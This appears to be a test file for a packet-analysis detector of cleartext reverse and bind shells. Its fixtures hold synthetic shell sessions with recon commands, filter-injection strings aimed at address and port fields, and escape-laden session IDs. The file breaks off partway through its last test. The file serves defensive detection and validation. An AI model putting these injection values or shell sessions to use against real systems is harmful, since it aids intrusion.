"""Cleartext interactive shells in packets: the stream query, TCP reassembly, the shell analysis, the rule and the
stage, with synthetic TShark stream-query rows (TShark itself is not needed)."""
import gzip
import hashlib
import json
import random
import subprocess
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from romulus.config import Settings
from romulus.detect.packets import CleartextInteractiveShell, analyze_stream
from romulus.detect.registry import ALL_PLAYBOOKS, fresh_direct_pack, fresh_pack
from romulus.evidence.typed import RawRef, TypedEvent, fv
from romulus.hunt import packets as hp
from romulus.sources import packets as pk
from romulus.sources.compile import compile_es
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.sources.profile import contract_from_types
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

PCAP = b"\xd4\xc3\xb2\xa1" + b"\x00" * 60
T0 = datetime(2024, 11, 18, 15, 0, 0, tzinfo=UTC)
TARGET = "arkime_sessions3-241118"
SHELL = "pcap.cleartext_interactive_shell"
VICTIM, ATTACKER = ("172.17.100.121", 50412), ("198.51.100.7", 4444)       # internal host, external listener
OPERATOR, WEB = ("10.0.0.5", 51000), ("10.0.0.9", 31337)                   # two internal hosts
KEY = pk.stream_key(VICTIM[0], VICTIM[1], ATTACKER[0], ATTACKER[1])


def conversation(turns, *, client=VICTIM, server=ATTACKER, t0=T0, step=0.5, mss=None, start_seq=1, syn=None):
    """TShark stream-query rows for a conversation: [(direction, bytes)], one segment per turn (or per mss),
    after an opening SYN from `syn` ("client" or "server") when given."""
    seq = {"c2s": start_seq, "s2c": start_seq}
    rows, frame, t = [], 0, t0.timestamp()
    if syn:
        src, dst = (client, server) if syn == "client" else (server, client)
        frame += 1
        rows.append({"frame.number": ["1"], "frame.time_epoch": [f"{t:.6f}"],
                     "frame.protocols": ["eth:ethertype:ip:tcp"], "ip.src": [src[0]], "ip.dst": [dst[0]],
                     "tcp.srcport": [str(src[1])], "tcp.dstport": [str(dst[1])], "tcp.seq": ["0"], "tcp.len": ["0"],
                     "tcp.payload": [], "tcp.flags.syn": ["1"], "tcp.flags.ack": ["0"]})
    for d, data in turns:
        pieces = [data[i:i + mss] for i in range(0, len(data), mss)] if mss else [data]
        for piece in pieces:
            frame += 1
            t += step
            src, dst = (client, server) if d == "c2s" else (server, client)
            rows.append({"frame.number": [str(frame)], "frame.time_epoch": [f"{t:.6f}"],
                         "frame.protocols": ["eth:ethertype:ip:tcp:data"], "ip.src": [src[0]], "ip.dst": [dst[0]],
                         "ipv6.src": [], "ipv6.dst": [], "tcp.srcport": [str(src[1])], "tcp.dstport": [str(dst[1])],
                         "tcp.seq": [str(seq[d])], "tcp.len": [str(len(piece))], "tcp.payload": [piece.hex()]})
            seq[d] += len(piece)
    return rows


def analyze(rows, key=KEY, cap=hp.STREAM_DIRECTION_BYTES):
    streams = pk.reassemble_tcp(rows, key, cap)
    return analyze_stream(streams.data, streams.chunks)


# A reverse shell: the internal victim connected out and runs `sh`; the listener types commands.
REVERSE = [("s2c", b"id\n"), ("c2s", b"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"),
           ("s2c", b"uname -a\n"),
           ("c2s", (b"Linux web01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 "
                   b"x86_64 GNU/Linux\n")),
           ("s2c", b"ls -la /tmp\n"),
           ("c2s", (b"total 8\ndrwxrwxrwt  2 root root 4096 Nov 18 15:00 .\ndrwxr-xr-x 19 root root 4096 Nov 12 "
                   b"09:00 ..\n"))]
# A bind shell: the operator connected to `bash -i` on the server.
BIND = [("s2c", (b"bash: cannot set terminal process group (1234): Inappropriate ioctl for device\n"
                b"bash: no job control in this shell\nwww-data@web01:/var/www/html$ ")),
        ("c2s", b"id\n"), ("s2c", b"uid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@web01:/var/www/html$ "),
        ("c2s", b"pwd\n"), ("s2c", b"/var/www/html\nwww-data@web01:/var/www/html$ "), ("c2s", b"exit\n")]


def _typed(chars: bytes) -> list[tuple[str, bytes]]:
    """Character-at-a-time typing with the server echoing each character."""
    out = []
    for c in chars:
        out += [("c2s", bytes([c])), ("s2c", bytes([c]))]
    return out


# A telnet login: option negotiation, login and password prompts, then a shell (character mode, with echo).
TELNET = ([("s2c", b"\xff\xfd\x18\xff\xfd\x20\xff\xfb\x01\xff\xfb\x03"), ("c2s", b"\xff\xfc\x18\xff\xfc\x20\xff\xfd\x01"),
           ("s2c", b"Ubuntu 22.04.3 LTS\r\nweb01 login: ")] + _typed(b"admin") + [("c2s", b"\r\x00"),
          ("s2c", b"\r\nPassword: "), ("c2s", b"s3cret-pw\r\x00"),
          ("s2c", b"\r\nLast login: Mon Nov 18 14:00:00 2024 from 10.0.0.5\r\nadmin@web01:~$ ")]
          + _typed(b"id") + [("c2s", b"\r\x00"),
          ("s2c", b"\r\nuid=1000(admin) gid=1000(admin) groups=1000(admin)\r\nadmin@web01:~$ ")] + _typed(b"exit"))
# cmd.exe sent back over a reverse connection (cmd echoes each command after its prompt).
WINDOWS = [("c2s", (b"Microsoft Windows [Version 10.0.19045.3693]\r\n(c) Microsoft Corporation. All rights reserved."
                   b"\r\n\r\nC:\\Users\\bob>")), ("s2c", b"whoami\r\n"),
           ("c2s", b"whoami\r\ncorp\\bob\r\n\r\nC:\\Users\\bob>"), ("s2c", b"ipconfig\r\n"),
           ("c2s", (b"ipconfig\r\n\r\nWindows IP Configuration\r\n\r\n\r\nEthernet adapter Ethernet0:\r\n\r\n"
                   b"C:\\Users\\bob>"))]
# A PTY-upgraded shell whose prompt is wrapped in terminal escapes.
ANSI = [("s2c", b"\x1b]0;root@db1: ~\x07\x1b[01;32mroot@db1\x1b[00m:\x1b[01;34m~\x1b[00m# "), ("c2s", b"id\r"),
        ("s2c", (b"id\r\nuid=0(root) gid=0(root) groups=0(root)\r\n\x1b]0;root@db1: ~\x07\x1b[01;32mroot@db1\x1b[00m:"
                b"\x1b[01;34m~\x1b[00m# ")), ("c2s", b"exit\r")]


# ---- the shell analysis ---------------------------------------------------------------------------

@pytest.mark.parametrize("turns, client, server, side, kinds", [
    (REVERSE, VICTIM, ATTACKER, "client", ["output:id", "output:ls", "output:uname"]),
    (BIND, OPERATOR, WEB, "server", ["banner", "output:id", "output:pwd", "prompt"]),
    (TELNET, OPERATOR, (WEB[0], 23), "server", ["login_dialogue", "output:id", "prompt"]),
    (WINDOWS, VICTIM, ATTACKER, "client", ["banner", "output:ipconfig", "output:whoami", "prompt"]),
    (ANSI, OPERATOR, WEB, "server", ["output:id", "prompt"]),
])
def test_interactive_shells_show_independent_indicators(turns, client, server, side, kinds):
    key = pk.stream_key(client[0], client[1], server[0], server[1])
    a = analyze(conversation(turns, client=client, server=server), key)
    assert (a.side, a.kinds) == (side, kinds)
    assert a.turns >= 3
    for ind in a.indicators:                       # cited by offset and digest of the exact bytes
        data = pk.reassemble_tcp(conversation(turns, client=client, server=server), key, 10 ** 6).data[ind.direction]
        assert hashlib.sha256(data[ind.offset:ind.offset + ind.length]).hexdigest() == ind.sha256


def test_indicator_offsets_map_to_relative_sequence_numbers():
    a = analyze(conversation(REVERSE, start_seq=1000))
    ident = next(i for i in a.indicators if i.kind == "output:id")
    assert ident.offset == 0 and ident.seq == 1000 and ident.direction == "c2s"
    assert ident.command_seq == 1000 and ident.command_length == 2       # `id` in the listener's stream


HARD_NEGATIVES = {
    # binary both ways (an unparsed proprietary protocol)
    "binary": [(d, random.Random(i).randbytes(300)) for i, d in enumerate(["c2s", "s2c"] * 12)],
    # a message bus carrying log records that contain a shell transcript; one batch ends exactly on a prompt
    "kafka": [(d, (b"\x00\x00\x00\x2a\x00\x01\x00\x0b\x00\x00\x00\x07\x00\x0aconsumer-1\x00\x00\x00\x01"
                   if d == "c2s" else
                   b"\x00\x00\x01\x10\x00\x00\x00\x07\x00\x00\x00\x00\x00\x01" + b"root@db1:~# id\n"
                   b"uid=0(root) gid=0(root) groups=0(root)\nbash: no job control in this shell\nroot@db1:~# "))
              for d in ["c2s", "s2c"] * 6],
    # a text protocol full of `$` (RESP): no prompt shape, no command output
    "dollars": [("c2s", b"*2\r\n$3\r\nGET\r\n$3\r\nkey\r\n"), ("s2c", b"$5\r\nhello\r\n")] * 8
               + [("c2s", b"QUOTE ACME\r\n"), ("s2c", b"PRICE 10$")] * 3,
    # a chat channel where someone pastes a shell transcript
    "chat": [("c2s", b"PRIVMSG #ops :root@web01:~# id\r\n"),
             ("s2c", b":bob!b@h PRIVMSG #ops :uid=0(root) gid=0(root) groups=0(root)\r\n"),
             ("c2s", b"PRIVMSG #ops :bash: no job control in this shell\r\n"),
             ("s2c", b":bob!b@h PRIVMSG #ops :Linux web01 5.15.0 GNU/Linux\r\n")] * 4,
    # an echo service: every line comes straight back
    "echo": [("c2s", b"whoami\n"), ("s2c", b"whoami\n"), ("c2s", b"/bin/pwd\n"), ("s2c", b"/bin/pwd\n"),
             ("c2s", b"id\n"), ("s2c", b"id\n")] * 3,
    # a password prompt and then a login prompt is not a login dialogue
    "prompt_order": [("s2c", b"Password: "), ("c2s", b"x\n"), ("s2c", b"login: "), ("c2s", b"y\n")],
    # one `id` exchange and nothing else
    "single_id": [("c2s", b"id\n"), ("s2c", b"uid=0(root) gid=0(root) groups=0(root)\n")],
    # echo text that looks like id output is not id output
    "echo_text": [("c2s", b"echo uid=0(root) gid=0(root)\n"), ("s2c", b"uid=0(root) gid=0(root)\n"),
                  ("c2s", b"echo Linux web01 GNU/Linux\n"), ("s2c", b"Linux web01 GNU/Linux\n")],
    # `ls` without -l and `cat` of another file: their outputs are not the recognised forms
    "args": [("c2s", b"ls /tmp\n"), ("s2c", (b"-rw-r--r-- 1 root root 4096 Nov 18 15:00 x\n-rw-r--r-- 1 root root 1 "
                                            b"Nov 18 15:00 y\n")),
             ("c2s", b"cat notes.txt\n"), ("s2c", b"root:x:0:0:root:/root:/bin/bash\n")],
    # a document over a cleartext socket that quotes a shell banner (one indicator, no turn-taking)
    "document": [("s2c", (b"Troubleshooting\n\nIf you see 'bash: no job control in this shell' run:\n"
                         b"bash: no job control in this shell\n"))],
    # telnet negotiation only, then silence: the prompt must be answered with typed text
    "negotiation": [("s2c", b"web01 login: "), ("c2s", b"\xff\xfc\x18\xff\xfc\x20"),
                    ("s2c", b"Password: "), ("c2s", b"\xff\xfd\x01")],
}


NEGATIVE_KINDS = {"single_id": ["output:id"]}          # one exchange: below the lone-indicator turn floor


@pytest.mark.parametrize("name", sorted(HARD_NEGATIVES))
def test_hard_negatives_never_reach_two_indicators(name):
    a = analyze(conversation(HARD_NEGATIVES[name], client=OPERATOR, server=WEB),
                pk.stream_key(OPERATOR[0], OPERATOR[1], WEB[0], WEB[1]))
    assert a.kinds == NEGATIVE_KINDS.get(name, []), a.kinds
    assert rule(stream_event(a)) == []


@pytest.mark.parametrize("prompts, expect", [(2, []), (3, ["prompt"])])
def test_a_bare_prompt_needs_three_answered_repeats(prompts, expect):
    turns = []
    for _ in range(prompts):
        turns += [("s2c", b"$ "), ("c2s", b"true\n")]
    assert analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB)).kinds == expect


def test_sh_without_a_terminal_prints_output_after_the_prompt_on_the_same_line():
    turns = [("s2c", b"$ "), ("c2s", b"id\n"), ("s2c", b"uid=0(root) gid=0(root)\n$ "), ("c2s", b"uname\n"),
             ("s2c", b"Linux\n$ "), ("c2s", b"true\n"), ("s2c", b"$ "), ("c2s", b"exit\n")]
    a = analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
    assert a.kinds == ["output:id", "output:uname", "prompt"]


def test_the_command_pairing_cap_is_reported_as_a_limit(monkeypatch):
    from romulus.detect import packets as packet_rules
    monkeypatch.setattr(packet_rules, "MAX_COMMANDS", 1)
    a = analyze(conversation(BIND, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
    assert a.limits and "were paired with output" in a.limits[0] and "output:pwd" not in a.kinds


def test_a_large_text_stream_is_analysed_within_bounds():
    import time
    lines = b"".join(b"line %d of a long text exchange\n" % i for i in range(9000))
    turns = [("c2s", lines[i:i + 1400]) if (i // 1400) % 2 == 0 else ("s2c", lines[i:i + 1400])
             for i in range(0, len(lines), 1400)]
    started = time.monotonic()
    a = analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
    assert a.kinds == [] and time.monotonic() - started < 10


def test_a_shell_error_must_name_the_command_just_sent():
    turns = [("s2c", b"$ "), ("c2s", b"id\n"), ("s2c", b"sh: 1: foo: not found\n$ "), ("c2s", b"exit\n")]
    assert "shell_error" not in analyze(conversation(turns, client=OPERATOR, server=WEB),
                                        pk.stream_key(*OPERATOR, *WEB)).kinds


def test_echoed_lookalike_output_is_not_command_output():
    a = analyze(conversation(HARD_NEGATIVES["echo_text"], client=OPERATOR, server=WEB),
                pk.stream_key(OPERATOR[0], OPERATOR[1], WEB[0], WEB[1]))
    assert not [k for k in a.kinds if k.startswith("output:")]


def test_a_failed_command_gives_a_shell_error_not_its_output():
    turns = [("s2c", b"$ "), ("c2s", b"ifconfig\n"), ("s2c", b"sh: 1: ifconfig: not found\n$ "),
             ("c2s", b"id\n"), ("s2c", b"uid=0(root) gid=0(root)\n$ "), ("c2s", b"exit\n")]
    a = analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
    assert "shell_error" in a.kinds and "output:ifconfig" not in a.kinds and "output:id" in a.kinds


def test_flag_groups_and_sudo_are_parsed_token_aware():
    turns = [("c2s", b"sudo -u root ls -alh '/var/www'\n"),
             ("s2c", (b"-rw-r--r-- 1 root root 4096 Nov 18 15:00 index.php\n"
                     b"drwxr-xr-x 2 root root 4096 Nov 18 2023 uploads\n")),
             ("c2s", b"/usr/bin/id\n"), ("s2c", b"uid=0(root) gid=0(root)\n")]
    a = analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
    assert a.kinds == ["output:id", "output:ls"]


def test_a_line_never_joins_bytes_across_a_capture_hole():
    rows = conversation([("c2s", b"id\n"), ("s2c", b"uid=0(ro"), ("s2c", b"XXXX"), ("s2c", b"ot) gid=0(root)\n")],
                        client=OPERATOR, server=WEB)
    del rows[2]                                         # the middle segment was never captured
    streams = pk.reassemble_tcp(rows, pk.stream_key(*OPERATOR, *WEB), 10 ** 6)
    assert streams.gaps["s2c"] == 1 and streams.data["s2c"] == b"uid=0(root) gid=0(root)\n"
    assert analyze_stream(streams.data, streams.chunks).kinds == []   # two partial lines, neither complete


def test_analysis_is_deterministic_and_independent_of_row_order():
    rows = conversation(BIND, client=OPERATOR, server=WEB, mss=7)
    shuffled = rows[:]
    random.Random(7).shuffle(shuffled)
    key = pk.stream_key(*OPERATOR, *WEB)
    a, b = analyze(rows, key), analyze(shuffled, key)
    assert [i.as_dict() for i in a.indicators] == [i.as_dict() for i in b.indicators]


# ---- TCP reassembly -------------------------------------------------------------------------------

def test_retransmissions_are_dropped_and_conflicting_ones_counted():
    rows = conversation([("c2s", b"hello "), ("c2s", b"world\n")], client=OPERATOR, server=WEB)
    dup = json.loads(json.dumps(rows[1]))
    dup["frame.number"] = ["9"]
    evil = json.loads(json.dumps(rows[1]))
    evil["frame.number"], evil["tcp.payload"] = ["10"], [b"WORLD\n".hex()]
    streams = pk.reassemble_tcp(rows + [dup, evil], pk.stream_key(*OPERATOR, *WEB), 10 ** 6)
    assert streams.data["c2s"] == b"hello world\n" and streams.conflicts["c2s"] == 1
    assert any("different bytes" in limit for limit in streams.limits())


def test_out_of_order_segments_are_placed_by_sequence():
    rows = conversation([("c2s", b"abc"), ("c2s", b"def"), ("c2s", b"ghi")], client=OPERATOR, server=WEB)
    streams = pk.reassemble_tcp(list(reversed(rows)), pk.stream_key(*OPERATOR, *WEB), 10 ** 6)
    assert streams.data["c2s"] == b"abcdefghi" and streams.gaps["c2s"] == 0


def test_the_per_direction_cap_cuts_and_says_so():
    rows = conversation([("s2c", b"x" * 100), ("s2c", b"y" * 100)], client=OPERATOR, server=WEB)
    streams = pk.reassemble_tcp(rows, pk.stream_key(*OPERATOR, *WEB), 150)
    assert streams.cut["s2c"] and len(streams.data["s2c"]) == 150 and not streams.cut["c2s"]
    assert any("cut at the per-direction byte cap" in limit for limit in streams.limits())


def test_foreign_and_unreadable_rows_are_counted_not_used():
    rows = conversation([("c2s", b"id\n")], client=OPERATOR, server=WEB)
    other = json.loads(json.dumps(rows[0]))
    other["tcp.srcport"] = ["999"]
    short = json.loads(json.dumps(rows[0]))
    short["tcp.len"], short["tcp.seq"] = ["10"], ["4"]
    streams = pk.reassemble_tcp(rows + [other, short], pk.stream_key(*OPERATOR, *WEB), 10 ** 6)
    assert streams.foreign == 1 and streams.unreadable == 1 and streams.data["c2s"] == b"id\nid\n"


def test_ipv6_and_tunnelled_rows_use_the_innermost_layer():
    key = pk.stream_key("2001:db8::5", 51000, "2001:db8::9", 23)
    row = {"frame.number": ["1"], "frame.time_epoch": ["1.0"], "frame.protocols": ["eth:ethertype:ip:gre:ipv6:tcp"],
           "ip.src": ["10.9.9.1"], "ip.dst": ["10.9.9.2"], "ipv6.src": ["2001:db8:0::5"], "ipv6.dst": ["2001:db8::9"],
           "tcp.srcport": ["51000"], "tcp.dstport": ["23"], "tcp.seq": ["1"], "tcp.len": ["3"], "tcp.payload": ["69640a"]}
    assert pk.reassemble_tcp([row], key, 100).data["c2s"] == b"id\n"


# ---- the stream query and filter injection ------------------------------------------------------------

def test_stream_filter_is_built_from_parsed_addresses_and_ports_only():
    assert pk.stream_filter(KEY) == ("(tcp.len > 0 || (tcp.flags.syn == 1 && tcp.flags.ack == 0)) && "
                                     "ip.addr == 172.17.100.121 && ip.addr == 198.51.100.7 && "
                                     "tcp.port == 50412 && tcp.port == 4444")
    v6 = pk.stream_key("2001:DB8:0::5", 51000, "2001:db8::9", 23)
    assert pk.stream_filter(v6).endswith("ipv6.addr == 2001:db8::5 && ipv6.addr == 2001:db8::9 && "
                                         "tcp.port == 51000 && tcp.port == 23")
    mapped = pk.stream_key("::ffff:10.0.0.5", 1, "10.0.0.9", 2)
    assert mapped.client_ip == "10.0.0.5"


@pytest.mark.parametrize("client_ip, client_port, server_ip, server_port", [
    ("10.0.0.1 || 1 == 1", 1, "10.0.0.2", 2),          # filter syntax in an address
    ("fe80::1%eth0 || frame", 1, "fe80::2", 2),          # an IPv6 zone is free text
    ("fe80::1%eth0", 1, "fe80::2", 2),
    (167772161, 1, "10.0.0.2", 2),                       # an integer is not an address string
    ("10.0.0.1", "4444", "10.0.0.2", 2),                 # a port must be an integer
    ("10.0.0.1", "4444 || tcp", "10.0.0.2", 2),
    ("10.0.0.1", True, "10.0.0.2", 2),
    ("10.0.0.1", 0, "10.0.0.2", 2),
    ("10.0.0.1", 70000, "10.0.0.2", 2),
    ("10.0.0.1", 1, "2001:db8::2", 2),                   # mixed versions
    (None, 1, "10.0.0.2", 2),
    ("x" * 300, 1, "10.0.0.2", 2),
])
def test_hostile_connection_fields_are_refused(client_ip, client_port, server_ip, server_port):
    with pytest.raises(pk.PacketError):
        pk.stream_key(client_ip, client_port, server_ip, server_port)


def test_a_hand_built_key_is_validated_again_before_it_reaches_a_filter(tmp_path):
    hostile = pk.StreamKey("10.0.0.1 || 1==1", 1, "10.0.0.2", 2)
    with pytest.raises(pk.PacketError):
        pk.stream_filter(hostile)
    with pytest.raises(pk.PacketError):
        pk.tshark_command(Settings(home=tmp_path), tmp_path / "a.pcap", "tcp_payload", stream=hostile)


def test_stream_query_argv_is_fixed_and_pins_its_own_preferences(tmp_path, monkeypatch):
    cap = tmp_path / "a.pcap"
    cap.write_bytes(PCAP)
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps([{"_source": {"layers": {
            "tcp.seq": ["1"], "tcp.len": ["3"], "tcp.payload": ["69640a"]}}}]).encode(), stderr=b"")

    monkeypatch.setattr(pk.subprocess, "run", fake_run)
    res = pk.run_tshark(Settings(home=tmp_path), cap, "tcp_payload", [tmp_path], stream=KEY)
    cmd = calls[0]
    assert "-c" not in cmd and "-d" not in cmd and cmd[cmd.index("-T") + 1] == "json"
    assert cmd[cmd.index("-Y") + 1] == pk.stream_filter(KEY)
    assert [cmd[i + 1] for i, a in enumerate(cmd) if a == "-o"] == list(pk.STREAM_PREFS)
    assert "tcp.desegment_tcp_streams:TRUE" not in cmd
    assert [cmd[i + 1] for i, a in enumerate(cmd) if a == "-e"] == pk.QUERIES["tcp_payload"][1]
    assert res.rows[0]["tcp.payload"] == ["69640a"] and res.rows[0]["ip.src"] == []


def test_queries_refuse_inputs_they_do_not_take(tmp_path):
    s, path = Settings(home=tmp_path), tmp_path / "a.pcap"
    with pytest.raises(pk.PacketError):
        pk.tshark_command(s, path, "tcp_payload")                                   # no connection
    with pytest.raises(pk.PacketError):
        pk.tshark_command(s, path, "http_messages", stream=KEY)                     # HTTP takes no connection
    with pytest.raises(pk.PacketError):
        pk.tshark_command(s, path, "tcp_payload", http_ports=[80], stream=KEY)      # streams take no decode-as


# ---- the rule ----------------------------------------------------------------------------------------

def stream_event(analysis, *, client=VICTIM, server=ATTACKER, sid="241118-STREAM000001", limits=None, ts=T0,
                 opened_by=None):
    fields = {"source.ip": client[0], "source.port": client[1], "destination.ip": server[0],
              "destination.port": server[1], "arkime.session_id": sid, "stream.opened_by": opened_by,
              "stream.turns": analysis.turns,
              "stream.shell.side": analysis.side, "stream.shell.kinds": analysis.kinds or None,
              "stream.shell.indicators": [i.as_dict() for i in analysis.indicators] or None,
              "stream.limits": limits}
    return TypedEvent(id=f"e-{sid}", family="tcp_stream", ts=ts, host=None,
                      fields={k: fv(v, f"fixture:{k}") for k, v in fields.items() if v is not None},
                      raw=[RawRef(target="arkime-pcap:x", native_id=sid)], normalizer="fixture")


def rule(*events):
    r = CleartextInteractiveShell()
    r.consume(list(events))
    return r.finalize()


def _analysis(turns, client, server):
    return analyze(conversation(turns, client=client, server=server), pk.stream_key(*client, *server))


@pytest.mark.parametrize("turns, client, server, opened_by, lane", [
    (REVERSE, VICTIM, ATTACKER, "client", "high"),              # internal shell side's SYN opened the connection
    (REVERSE, VICTIM, ATTACKER, None, "high"),                  # no SYN, but the operator side is external
    (REVERSE, OPERATOR, WEB, "client", "high"),                 # reverse shell between two internal hosts
    (REVERSE, OPERATOR, WEB, None, "lead"),                     # same, opener not captured: not claimed
    (REVERSE, OPERATOR, WEB, "server", "lead"),                 # Arkime's client did not open it
    (BIND, OPERATOR, WEB, "client", "lead"),                    # internal bind shell, internal operator
    (BIND, ATTACKER, WEB, "client", "high"),                    # internal bind shell, external operator
    (REVERSE, ATTACKER, ("203.0.113.9", 4444), "client", "lead"),   # both ends external (transit traffic)
    (BIND, VICTIM, ATTACKER, "client", "lead"),                 # an internal host operating an external shell
])
def test_lanes_follow_the_shell_side_and_who_connected(turns, client, server, opened_by, lane):
    a = _analysis(turns, client, server)
    m = rule(stream_event(a, client=client, server=server, opened_by=opened_by))
    assert len(m) == 1 and m[0].proposed_lane == lane and m[0].proposed_lane != "context"
    assert m[0].severity == "high" and any(n.startswith(f"lane {lane}:") for n in m[0].notes)


def test_claim_says_what_was_observed_and_carries_no_payload():
    a = _analysis(REVERSE, VICTIM, ATTACKER)
    m = rule(stream_event(a, opened_by="client"))[0]
    assert "is consistent with an interactive command shell over a cleartext channel" in m.claim
    assert "the client (172.17.100.121:50412) sent what reads as shell output" in m.claim
    assert "SYN shows it opened the connection, as a reverse shell does" in m.claim
    assert "not established by these records" in m.claim
    assert "opening SYN was not captured" in rule(stream_event(a))[0].claim
    assert "after a 'id' command, the other side returned a uid=…(…) gid=…(…) identity line" in m.claim
    for text in ("www-data", "uid=33", "web01", "5.15.0", "drwx"):
        assert text not in m.claim                              # payload never enters the claim
    ident = next(i for i in a.indicators if i.kind == "output:id")
    assert f"SHA-256 {ident.sha256[:16]}" in m.claim and f"relative seq {ident.seq}" in m.claim
    assert m.confidence == "high" and m.claim_type == "network_observation"
    assert {p.field for p in m.predicate} >= {"stream.shell.kinds", "stream.shell.side", "stream.shell.indicators"}


def test_two_indicators_give_medium_confidence_and_one_gives_nothing():
    two = _analysis(ANSI, OPERATOR, WEB)
    assert rule(stream_event(two, client=OPERATOR, server=WEB))[0].confidence == "medium"
    one = _analysis(HARD_NEGATIVES["single_id"], OPERATOR, WEB)
    assert one.kinds == ["output:id"] and rule(stream_event(one, client=OPERATOR, server=WEB)) == []


def test_limits_become_notes_and_missing_fields_are_counted_not_dropped():
    a = _analysis(REVERSE, VICTIM, ATTACKER)
    m = rule(stream_event(a, limits=["s2c: 1 gap(s), 10 byte(s) never captured"]))[0]
    assert "content incomplete: s2c: 1 gap(s), 10 byte(s) never captured" in m.notes
    r = CleartextInteractiveShell()
    ev = stream_event(a)
    del ev.fields["destination.ip"]
    no_side = stream_event(a, sid="241118-STREAM000002")
    del no_side.fields["stream.shell.side"]
    r.consume([ev, no_side])
    assert r.missing_required == 2 and r.finalize() == []


def test_hostile_session_ids_are_shown_escaped():
    a = _analysis(REVERSE, VICTIM, ATTACKER)
    m = rule(stream_event(a, sid="241118-\u202eEVIL\x1b[31m"))[0]
    assert "\u202e" not in m.claim and "\x1b" not in m.claim and "\\u202e" in m.claim


def test_the_rule_is_registered_packet_only_positive_only_and_attack_ids_exist():
    cls = CleartextInteractiveShell
    assert cls in ALL_PLAYBOOKS and cls.kind == "packet" and not cls.assures_negative and cls.positive_only_reason
    assert not [p for p in fresh_pack() + fresh_direct_pack() if isinstance(p, cls)]
    assert set(cls.card) >= {"behavior", "telemetry", "fidelity", "benign_and_cost", "query_cost", "next_pivot",
                             "adds", "research_basis", "retrieval"}
    with gzip.open(Path(__file__).resolve().parents[1] / "content/attack/enterprise-attack-20.0.json.gz") as fh:
        stix = json.load(fh)
    ids = {ref["external_id"] for obj in stix["objects"] if obj.get("type") == "attack-pattern"
           and not obj.get("revoked") and not obj.get("x_mitre_deprecated")
           for ref in obj.get("external_references", []) if ref.get("source_name") == "mitre-attack"}
    assert set(cls.attack) <= ids


# ---- the stage, end to end with stubbed Arkime and TShark --------------------------------------------------

def _ms(dt):
    return int(dt.timestamp() * 1000)


def sdoc(_id, client, server, *, first=T0 - timedelta(minutes=1), last=T0 + timedelta(minutes=10), protocol=("tcp",),
         cpk=40, spk=40, cb=600, sb=4000):
    return {"_id": _id, "_index": TARGET, "_source": {
        "node": "inetfw", "firstPacket": _ms(first), "lastPacket": _ms(last), "protocol": list(protocol),
        "protocolCnt": len(protocol), "network": {"community_id": f"1:{_id}="},
        "source": {"ip": client[0], "port": client[1], "packets": cpk},
        "destination": {"ip": server[0], "port": server[1], "packets": spk},
        "client": {"bytes": cb}, "server": {"bytes": sb}}}


def _contract(**extra):
    types = {"firstPacket": "date", "lastPacket": "date", "protocol": "keyword", "protocolCnt": "long",
             "source.packets": "long", "destination.packets": "long", "client.bytes": "long", "server.bytes": "long",
             "http.bodyMagic": "keyword", "network.community_id": "keyword", **extra}
    return contract_from_types(TARGET, {k: v for k, v in types.items() if v})


class _Packets:
    def __init__(self, capped=(), error=None):
        self.capped, self.error, self.calls, self.max_bytes = set(capped), error, [], 32 * 1024 * 1024

    def fetch(self, ids, dest, max_bytes=None):
        self.calls.append((list(ids), max_bytes))
        if self.error:
            return pk.PacketFetch(None, ids, error=self.error)
        dest.write_bytes(PCAP)
        return pk.PacketFetch(dest, ids, len(PCAP), capped=bool(set(ids) & self.capped))


def _stage(tmp_path, monkeypatch, docs, rows, *, truncated=(), packets=None, contract=None, window=None, intents=None,
           outcome=None, tshark_calls=None):
    def execute(client, intent, contract):
        if intents is not None:
            intents.append(intent)
        if intent.kind == "histogram":
            return SearchOutcome(target=intent.target, fingerprint="h", started_at=T0, ended_at=T0,
                                 completeness=Completeness.complete, total=0, total_relation="eq")
        records = docs if intent.purpose == hp.STREAM_PURPOSE else []
        if intent.purpose == hp.STREAM_PURPOSE and outcome is not None:
            return outcome
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=T0, ended_at=T0,
                             completeness=Completeness.complete, total=len(records), total_relation="eq",
                             returned=len(records), records=records)

    def tshark(s, pcap, query, dirs, http_ports=(), stream=None):
        assert query == "tcp_payload" and pcap.exists() and isinstance(stream, pk.StreamKey)
        if tshark_calls is not None:
            tshark_calls.append(stream)
        return pk.TsharkResult(rows=rows.get(stream, []), truncated=stream in truncated)

    def merge(s, parts, dest, dirs):
        dest.write_bytes(PCAP)

    monkeypatch.setattr(hp, "execute", execute)
    monkeypatch.setattr(hp, "run_tshark", tshark)
    monkeypatch.setattr(hp, "merge_captures", merge)
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {}, "d", "t")
    window = window or Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
    summary = hp.run_packet_stage(Settings(home=tmp_path), repo, None, "h1", window,
                                  {TARGET: contract or _contract()}, packets=packets or _Packets())
    return repo, summary


def _cell(repo):
    return next(c for c in repo.rule_cells("h1") if c["rule_id"] == SHELL)


def _found(repo):
    return [c for c in repo.candidates("h1") if c["rule_id"] == SHELL]


REV_DOC = sdoc("241118-REVERSE00001", VICTIM, ATTACKER)
REV_ROWS = {KEY: conversation(REVERSE, syn="client")}
BIND_KEY = pk.stream_key(*OPERATOR, *WEB)


def test_stage_publishes_a_cited_high_finding_without_payload_in_the_raw_copy(tmp_path, monkeypatch):
    from romulus.report import manifest as rm
    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS)
    streams = summary["streams"][TARGET]
    assert summary["status"] == "complete" and streams["status"] == "complete"
